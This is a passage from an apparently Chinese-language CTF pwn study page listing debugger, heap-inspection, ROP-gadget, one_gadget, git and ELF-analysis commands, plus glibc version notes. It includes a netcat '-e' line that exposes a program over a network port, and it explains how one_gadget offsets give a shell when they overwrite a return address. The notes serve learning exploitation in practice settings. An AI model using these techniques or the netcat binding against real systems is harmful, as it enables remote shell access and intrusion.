</span></span><span class=line><span class=cl><span class=n>canary</span> <span class=c1># 查看canary</span>
</span></span><span class=line><span class=cl><span class=n>tls</span> <span class=c1># 查看tls</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>*</span><span class=p>(</span><span class=n>struct</span> <span class=n>pthread</span><span class=o>*</span><span class=p>)</span><span class=n>address</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>set</span> <span class=n>detach</span><span class=o>-</span><span class=n>on</span><span class=o>-</span><span class=n>fork</span> <span class=n>off</span> <span class=c1># 同时调试父进程与子进程</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pwndbg</span> <span class=c1># 查看命令</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>retaddr</span> <span class=c1># 查看返回地址</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>info</span> <span class=n>sharedlibrary</span> <span class=c1># 显示libc.so.6的调试符号</span></span></span></code></pre></div></div><p><strong>查看内存：</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>x/nfu &lt;addr&gt;
</span></span><span class=line><span class=cl><span class=c1># n：表示要显示的内存单元个数</span>
</span></span><span class=line><span class=cl><span class=c1># f：表示显示方式    x:十六进制    d:十进制    u:十进制无符号整型    o:八进制</span>
</span></span><span class=line><span class=cl><span class=c1>#                   t:二进制    a:十六进制    i:指令地址格式    c:字符格式</span>
</span></span><span class=line><span class=cl><span class=c1>#                   f:浮点数格式 s:字符串形式</span>
</span></span><span class=line><span class=cl><span class=c1># u：表示一个地址单元的长度    b:单字节    h:双字节    w:四字节    g:八字节</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>x/10gx address 	<span class=c1># 一般</span>
</span></span><span class=line><span class=cl>x/20i func 		<span class=c1># 查看函数反汇编代码</span>
</span></span><span class=line><span class=cl>x/80ga address <span class=c1># 常用</span></span></span></code></pre></div></div><p><strong>exp 动态调试</strong>：</p><ol><li>exp 的输入 send 前加入<code>raw_input()</code>，然后执行 exp，</li><li><code>ps -ef | grep pwn_elf</code>找到 PID</li><li>另一个窗口<code>gdb attach PID</code>，在 gdb 中<code>disass main</code>找到漏洞点和结束前的断点位置，<code>b * 0xaaaa</code>，输入<code>c</code>，在 exp 中回车。</li><li>或代码中在开头加入<code>gdb.attach(io)</code>，在每次发送 payload 前加入<code>pause()</code>可多次调试，然后终端任意按键查看 gdb 变化</li></ol><p><strong>堆调试</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>fastbin 	<span class=c1># 查看fastbins</span>
</span></span><span class=line><span class=cl>heap 		<span class=c1># 查看堆</span>
</span></span><span class=line><span class=cl>arenainfo 	<span class=c1># 查看main_arena</span>
</span></span><span class=line><span class=cl>vis 		<span class=c1># 不同颜色可查看堆情况</span>
</span></span><span class=line><span class=cl>tcache 		<span class=c1># tcache详细信息</span>
</span></span><span class=line><span class=cl>try_free addr + 0x10 <span class=c1># 查看是否能够释放某个堆块</span></span></span></code></pre></div></div><p><strong>解决问题：</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>pwndbg&gt; heap
</span></span><span class=line><span class=cl>heap: This <span class=nb>command</span> only works with libc debug symbols.
</span></span><span class=line><span class=cl>They can probably be installed via the package manager of your choice.
</span></span><span class=line><span class=cl>See also: https://sourceware.org/gdb/onlinedocs/gdb/Separate-Debug-Files.html
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>E.g. on Ubuntu/Debian you might need to <span class=k>do</span> the following steps <span class=o>(</span><span class=k>for</span> 64-bit and 32-bit binaries<span class=o>)</span>:
</span></span><span class=line><span class=cl>sudo apt-get install libc6-dbg
</span></span><span class=line><span class=cl>sudo dpkg --add-architecture i386
</span></span><span class=line><span class=cl>sudo apt-get install libc-dbg:i386</span></span></code></pre></div></div><p>该命令可查看单独调试信息文件的目录<code>show debug-file-directory</code></p><ul><li>用 gdb 进行调试，显示一些堆栈格式需要在 gdb 中设置 debug 文件夹，从<code>glibc-all-in-one</code>中复制<code>.debug</code>文件夹到题目目录中</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>cp -r ~/tools/glibc-all-in-one/libs/x.xx-3ubuntu1_amd64/.debug/ ./debug</span></span></code></pre></div></div><ul><li>程序运行前 gdb 中设置<code>debug file</code>就能正常使用 gdb 调试符号功能</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=nb>set</span> <span class=n>debug</span><span class=o>-</span><span class=n>file</span><span class=o>-</span><span class=n>directory</span> <span class=n>debug</span><span class=o>/</span></span></span></code></pre></div></div><h3 id=pwngdb>Pwngdb</h3><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>parseheap    	<span class=c1># 解析堆的排布</span>
</span></span><span class=line><span class=cl>magic    		<span class=c1># 打印 glibc 中有用的变量和函数</span>
</span></span><span class=line><span class=cl>heapinfoall    	<span class=c1># 打印所有线程堆的信息</span>
</span></span><span class=line><span class=cl>bcall    		<span class=c1># 在所有xx函数调用下断点</span>
</span></span><span class=line><span class=cl>tls    			<span class=c1># 打印线程本地存储地址</span>
</span></span><span class=line><span class=cl>fpchain    		<span class=c1># 显示FILE的链接列表</span></span></span></code></pre></div></div><h3 id=gdb-dashboard>gdb-dashboard</h3><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl><span class=c1>#下载 适合单独调试 调IOT</span>
</span></span><span class=line><span class=cl>wget -P ~ https://github.com/cyrus-and/gdb-dashboard/raw/master/.gdbinit
</span></span><span class=line><span class=cl>pip install pygments</span></span></code></pre></div></div><p>GDB 调试组合：</p><ol><li><code>pwndbg + Pwngdb</code>：适用于<code>userland pwn</code></li><li><code>gef + Pwngdb</code>：适用于<code>qemu/kernel pwn</code></li></ol><h3 id=ropgadget>ROPgadget</h3><p>生成构造 ROP 链</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>ROPgadget --binary xxxfile --only <span class=s2>&#34;pop|ret&#34;</span> <span class=p>|</span> grep rdi   	<span class=c1># 只含有pop和ret的指令</span>
</span></span><span class=line><span class=cl>ROPgadget --binary xxx --ropchain 							<span class=c1># 自动生成ROP链</span></span></span></code></pre></div></div><h3 id=one_gadget>one_gadget</h3><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>one_gadget libc_file <span class=c1># 一个地址就可以完成攻击目的</span>
</span></span><span class=line><span class=cl><span class=c1># 获取libc文件中的一个利用路径，即找到libc偏移xxx地址的地方，满足约束条件即可一步getshell</span>
</span></span><span class=line><span class=cl><span class=c1># 构造libcBase + xxx(地址)覆盖return地址即可</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>one_gadget -b <span class=o>[</span>BuildID<span class=o>[</span>sha1<span class=o>]</span> of libc<span class=o>]</span> <span class=c1>#BuildID用file获取</span>
</span></span><span class=line><span class=cl>one_gadget xxxxxx -l <span class=m>2</span></span></span></code></pre></div></div><h3 id=vscode>VSCODE</h3><p><code>shift+alt+↓</code>：快捷复制一行</p><p>调试时<code>监控</code>双击</p><ul><li><code>&amp;var</code>可以看 var 变量的地址</li><li><code>&amp;var.subvar</code>可以看 var 结构体的其中一个类型变量的地址</li></ul><p>滚轮中键下滑可以编辑多行</p><h3 id=git>git</h3><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>git init <span class=c1># git初始化, 会生成.git文件</span>
</span></span><span class=line><span class=cl>git <span class=nb>help</span> init <span class=c1># 查看帮助</span>
</span></span><span class=line><span class=cl>git status <span class=c1># 查看git commit状态</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>git add file <span class=c1># 加入cache缓冲区</span>
</span></span><span class=line><span class=cl>git add -p file <span class=c1># 交互式添加文件 s拆分 y添加暂存区 n不添加暂存区 q退出</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>git commit -m <span class=s2>&#34;name&#34;</span> <span class=c1># 从缓冲区提交</span>
</span></span><span class=line><span class=cl>git log --all --graph --decorate --oneline <span class=c1># 查看提交情况及信息</span>
</span></span><span class=line><span class=cl>git cat-file -p &lt;object&gt; <span class=c1># &lt;object&gt;是一个对象的哈希值, 查看某个commit对象的详细信息</span>
</span></span><span class=line><span class=cl>git checkout &lt;object/branch&gt; <span class=c1># 工作目录和索引切换到指定的对象或引用或分支</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>git diff &lt;object&gt; file <span class=c1># 可以查看某个提交与当前工作目录(HEAD)间文件的更改</span>
</span></span><span class=line><span class=cl>git diff &lt;object1&gt; &lt;object2&gt; file <span class=c1># 比较两次提交间文件变化</span>
</span></span><span class=line><span class=cl>git diff --cached <span class=c1># 查看已暂存的更改</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>git branch <span class=c1># 列出本地分支, * 标记当前分支, -r 远程分支, -a 所有分支 -vv 更详细</span>
</span></span><span class=line><span class=cl>git branch &lt;branch-name&gt; <span class=c1># 创建新分支</span>
</span></span><span class=line><span class=cl>git branch --set-upstream-to<span class=o>=</span>&lt;remote_name&gt;/&lt;remote_branch&gt; <span class=c1># 关联本地分支和远程分支</span>
</span></span><span class=line><span class=cl>git checkout -b &lt;new-branch&gt; <span class=c1># 创建并切换到新分支</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>git merge xx <span class=c1># 合并分支到主分支</span>
</span></span><span class=line><span class=cl>git merge --abort <span class=c1># 发生冲突时使用命令暂停 进入文件会有冲突提示, 删除并修改</span>
</span></span><span class=line><span class=cl>git add file<span class=p>;</span> git merge --continue <span class=c1># 解决冲突继续前先将文件加入cache缓冲区</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>git remote <span class=c1># 查看远程仓库</span>
</span></span><span class=line><span class=cl>git remote add origin &lt;url&gt; <span class=c1># 将新的远程仓库添加到本地git仓库</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>git push &lt;remote_name&gt; &lt;<span class=nb>local</span> branch&gt;:&lt;remote branch&gt;
</span></span><span class=line><span class=cl><span class=c1># git push origin master:master 本地分支更改提交到远程仓库指定分支</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>git fetch <span class=c1># 下载最新提交和更新</span>
</span></span><span class=line><span class=cl>git <span class=nv>pull</span> <span class=o>=</span> git fetch<span class=p>;</span> git merge <span class=c1># 下载最新信息后合并更新到本地分支</span>
</span></span><span class=line><span class=cl>git clone --shallow <span class=c1># 只包含最近的提交，而不是整个提交历史</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>git stash <span class=c1># 临时保存当前工作目录和暂存区的更改到堆栈</span>
</span></span><span class=line><span class=cl>git stash pop <span class=c1># 恢复并删除stash</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>vim .gitignore <span class=c1># 将需要忽略不提交的文件写入, 可用正则匹配</span></span></span></code></pre></div></div><h3 id=linux>Linux</h3><p><strong>readelf</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>readelf -e xxx <span class=c1># 分析ELF程序的工具，可以查看所有节头信息</span>
</span></span><span class=line><span class=cl>readelf -S xxx <span class=c1># 节表</span>
</span></span><span class=line><span class=cl>readelf -l a.out <span class=c1># 程序头表/段表 整理节表组成内存页, 且按权限分了类, 可以看到未运行文件大小和运行后内存大小</span>
</span></span><span class=line><span class=cl>readelf -r a.out <span class=c1># 重定位表</span>
</span></span><span class=line><span class=cl>readelf -s a.out <span class=c1># 符号表 主要链接和调试中使用, strip elf命令去掉后IDA分析只能分析出sub_XXXX</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>readelf -S  vuln  <span class=p>|</span> grep debug <span class=c1>#查看是否有调试信息</span>
</span></span><span class=line><span class=cl>readelf -s vuln <span class=c1>#查看是否去除符号表</span></span></span></code></pre></div></div><p><strong>objdump</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>objdump -d xxx -M intel <span class=c1># 分析二进制文件的工具</span></span></span></code></pre></div></div><p><strong>hexdump</strong>——分析文件的十六进制</p><p><strong>ldd</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>jshiro@ubuntu:~/Desktop/ctf$ ldd elf <span class=c1># 用于查看程序连接的所有库</span>
</span></span><span class=line><span class=cl>        linux-vdso.so.1 <span class=o>(</span>0x00007ffc561bb000<span class=o>)</span>
</span></span><span class=line><span class=cl>        libc.so.6 <span class=o>=</span>&gt; /lib/x86_64-linux-gnu/libc.so.6 <span class=o>(</span>0x00007f17383a4000<span class=o>)</span>
</span></span><span class=line><span class=cl>        /lib64/ld-linux-x86-64.so.2 <span class=o>(</span>0x00007f17385de000<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=c1>#libc.so.6软连接</span></span></span></code></pre></div></div><p><strong>strings</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>strings elf <span class=c1># 查看一些字符串如/bin/sh</span></span></span></code></pre></div></div><p><strong>gcc</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>-S 				<span class=c1># 汇编</span>
</span></span><span class=line><span class=cl>-g 				<span class=c1># gdb调试时显示c源代码而不是汇编代码</span>
</span></span><span class=line><span class=cl>-pthread		<span class=c1># 使用多线程</span>
</span></span><span class=line><span class=cl>--static 		<span class=c1># 静态链接</span>
</span></span><span class=line><span class=cl>-Wall -Wextra 	<span class=c1># 开启告警</span>
</span></span><span class=line><span class=cl>-std<span class=o>=</span>c++11		<span class=c1># 支持c++11</span>
</span></span><span class=line><span class=cl>-c				<span class=c1># 生成.o目标文件</span>
</span></span><span class=line><span class=cl>-E				<span class=c1># 进行预编译/预处理</span>
</span></span><span class=line><span class=cl>-O1, -O2		<span class=c1># 优化</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>nasm -f elf32/elf64 xxx        <span class=c1># 编译</span>
</span></span><span class=line><span class=cl>ld -m elf_i386/elf_x86_64 xxx  <span class=c1># 链接</span></span></span></code></pre></div></div><p><strong>nc</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc ip port
</span></span><span class=line><span class=cl>nc -lvp <span class=m>8888</span> -e ./pwn <span class=c1># 映射程序 IO</span></span></span></code></pre></div></div><p><strong>Debian</strong></p><ul><li>Debian 安装 python 包时不用 pip install 命令，而是直接使用<code>apt install python3-包名</code></li><li>将安装包 tar.gz 下载后解压<ul><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-JSON"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-JSON data-lang=JSON><span class=line><span class=cl> <span class=err>tar</span> <span class=err>xzf</span> <span class=err>xxx.tar.gz</span>
</span></span><span class=line><span class=cl> <span class=err>cd</span> <span class=err>xxx</span>
</span></span><span class=line><span class=cl> <span class=err>python</span><span class=mi>3</span> <span class=err>setup.py</span> <span class=err>install</span></span></span></code></pre></div></div></li><li><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># 使用虚拟环境</span>
</span></span><span class=line><span class=cl><span class=n>apt</span> <span class=n>install</span> <span class=n>python3</span><span class=o>-</span><span class=n>venv</span>
</span></span><span class=line><span class=cl><span class=n>pthon3</span> <span class=o>-</span><span class=n>m</span> <span class=n>venv</span> <span class=n>myenv</span>
</span></span><span class=line><span class=cl><span class=n>source</span> <span class=n>myenv</span><span class=o>/</span><span class=nb>bin</span><span class=o>/</span><span class=n>activate</span>
</span></span><span class=line><span class=cl><span class=n>pip</span> <span class=n>install</span> <span class=n>xxx</span></span></span></code></pre></div></div></li></ul></li></ul><h3 id=libc-database>libc-database</h3><p>构建本地 libc 偏移量数据库，可替代 glibc-all-in-one</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 下载libc符号表与偏移文件</span>
</span></span><span class=line><span class=cl>./get
</span></span><span class=line><span class=cl>./get ubuntu debian
</span></span><span class=line><span class=cl>./get all
</span></span><span class=line><span class=cl><span class=c1># 下载的libc存放在db中，依赖db通过符号和偏移查找libc版本</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># find根据符号和偏移找到libc版本呢</span>
</span></span><span class=line><span class=cl>./find system 0xaaa
</span></span><span class=line><span class=cl>./dump libcx_x.xx-xubuntux_xxx <span class=c1># 查找()中libc常用符号和偏移，后面加上system指定查找某符号偏移</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># add 手动添加libc库到db</span>
</span></span><span class=line><span class=cl>./add libcxxx.so
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># identify判断某个libc是否已存在于db，支持hash查找</span>
</span></span><span class=line><span class=cl>md5sum ./libc-xx.so
</span></span><span class=line><span class=cl>./identify <span class=nv>md5</span><span class=o>=</span>xxxxxxxxxxxxxxxxxxxxxx
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># download 下载与libc ID对应的整个libc到libs目录</span>
</span></span><span class=line><span class=cl>./download libcx_x.xx-xubuntux_xx</span></span></code></pre></div></div><p><strong>libc-database</strong>中 libc 和 ld 带符号信息，但没有 glibc-all-in-one 中配置的 debug，即在 gdb 调试时无法显示符号信息，需要手动下载：</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>dpkg-deb -x libc6-dbg_x.xx-xubuntux.x_amd64.deb ./sym
</span></span><span class=line><span class=cl>cp ~/sym/usr/lib/debug/lib/x86_64-linux-gnu/ xxxx/.debug/ <span class=c1># 其中file libc和ld会带有with debug_info, not stripped信息</span>
</span></span><span class=line><span class=cl><span class=c1># 最终在gdb中set debug-file-directory xxxx/.debug/</span></span></span></code></pre></div></div><h3 id=debuginfod>debuginfod</h3><ul><li>用于管理 libc 的调试符号信息，ubuntu22.04 以上该功能 gdb 默认启用</li></ul><p>【旧版本】</p><ul><li>gdb10.1 版本支持 debuginfod，且 elfutils-0.179 后才支持，编译 gdb configure 加入<code>--with-debuginfod</code></li><li><code>vim /etc/debuginfod/ubuntu.urls</code>写入<code>https://debuginfod.ubuntu.com</code></li><li>pwndbg 中在<code>~/.gdbinit</code>写入<code>set debuginfod enabled on</code></li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>export</span> <span class=nv>DEBUGINFOD_URLS</span><span class=o>=</span>https://debuginfod.deepin.com</span></span></code></pre></div></div><h2 id=基础知识>基础知识</h2><h3 id=计组>计组</h3><p><strong>CPU 架构</strong></p><ul><li><p><strong>CISC</strong>复杂指令集：intel、AMD 的 x86</p></li><li><p><strong>RISC</strong>精简指令集：ARM、MIPS、Power PC</p></li><li><p><strong>intel</strong> (英特尔)与 <strong>amd</strong> (超威半导体)是<strong>x86</strong>架构 CPU 制造商</p></li><li><p><strong>ARM</strong>公司是<strong>arm</strong>架构 CPU 制造商</p></li></ul><p><strong>CPU</strong></p><p><strong>amd64</strong>是<strong>X86</strong>架构的<strong>CPU</strong>，64 位版。<strong>amd64</strong>又叫<strong>X86_64</strong>。主流的桌面 PC，笔记本电脑，服务器（包括虚拟机）都在用 X86_64 的 CPU</p><p><strong>arm64</strong>是<strong>ARM</strong>架构的<strong>CPU</strong>，64 位版。有些路由器、嵌入式设备、手机、安卓平板电脑在用 arm64 的 CPU</p><p><strong>MIPS</strong>是<strong>MIPS</strong>架构的<strong>CPU</strong>。有些嵌入式设备和家用路由器在用 MIPS 的 CPU</p><p><strong>x86 架构</strong></p><p>x86 和 x86_64 : 基于 X86 架构的不同版本, 位数不同，32 位和 64 位，其中<code>x86_64 = x64 = amd64</code></p><p>x86 版本是 Intel 率先研发出 x86 架构, x86_64 版本(也称 x64)是 amd 率先研发 x86 的 64 位版本, 所以 x86_64 也叫 amd64</p><p>x86：一个地址存 4 个字节；amd64：一个地址存 8 个字节</p><p>CPU 包含 4 个层：Ring0-Ring4，Ring3 为用户态，Ring0 为内核态</p><h3 id=glibc>Glibc</h3><ul><li>glibc-2.23：ubuntu16.04</li><li>glibc-2.27：ubuntu18.04<ul><li>加入了 tcache</li></ul></li><li>glibc-2.29：ubuntu19.04</li><li>glibc-2.30~31：ubuntu20.04</li><li>glibc-2.34：ubuntu22.04<ul><li>删除了 malloc-hook，exit-hook 等一系列 hook</li></ul></li></ul><p><strong>ubuntu</strong>下查看<code>glibc</code>版本</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-Bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-Bash data-lang=Bash><span class=line><span class=cl>getconf GNU_LIBC_VERSION
</span></span><span class=line><span class=cl>ldd --version
</span></span><span class=line><span class=cl>./libc.so.6 <span class=c1># 执行libc文件查看版本</span>
</span></span><span class=line><span class=cl>strings libc.so.6 <span class=p>|</span> grep ubuntu <span class=c1># 查看给定libc对应ubuntu版本</span>
</span></span><span class=line><span class=cl>strings libc.so.6 <span class=p>|</span> grep version <span class=c1># 查看libc版本</span></span></span></code></pre></div></div><p><strong>编译 glibc</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
